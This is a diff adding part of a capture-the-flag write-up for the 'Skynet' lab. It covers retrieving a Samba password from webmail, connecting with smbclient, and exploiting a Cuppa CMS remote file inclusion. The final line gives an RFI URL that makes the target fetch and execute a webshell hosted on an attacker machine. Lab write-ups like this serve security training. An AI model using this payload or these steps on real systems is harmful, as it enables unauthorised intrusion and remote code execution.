@@ -51,3 +51,32 @@ Now we have username and password, so let's try it on `squirrelmail` directory. 
 
 ![Alt text](../Screenshots/Skynet/squirrelmail_login_home.png)
 
+Now click on the first mail having subject **Samba password reset** and you will find the password:
+
+![Alt text](../Screenshots/Skynet/password.png)
+
+Subject shows that this is the password of samba shares. So let's try this password:
+
+```bash
+smbclient //<target_ip>/milesdyson -U 'WORKGROUP\\milesdyson%)s{A&2Z=F^n_E.B`'
+```
+
+Now go to `notes` directory and there you will find `important.txt` file. Download it using `get` command. Now read this file and you will find something like that:
+
+![Alt text](../Screenshots/Skynet/hidden_directory.png)
+
+I suspected that this can be a hidden directory written in the 1st line. I tried and was right, but found nothing interested there. But then I again did the directory enumeration:
+
+![Alt text](../Screenshots/Skynet/hidden_dir_enum.png)
+
+Interesting directory found named `administrator`. I went to it and found there is cuppa cms is running.
+
+Now the next question was helpful which is asking about remote file inclusion. I google about remote file inclusion in cuppa cms and found an exploit in [exploit-db](https://www.exploit-db.com/exploits/25971).
+
+
+By reading the exploit I understood if I host a webshell in my attacker machine, host it via python server then i can exploit the remote file inclusion vulnerability in the target system using the following link:
+
+```
+http://<target_ip>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<attacker_ip>:<attacker_port>/shell.txt&cmd=ls
+```
+
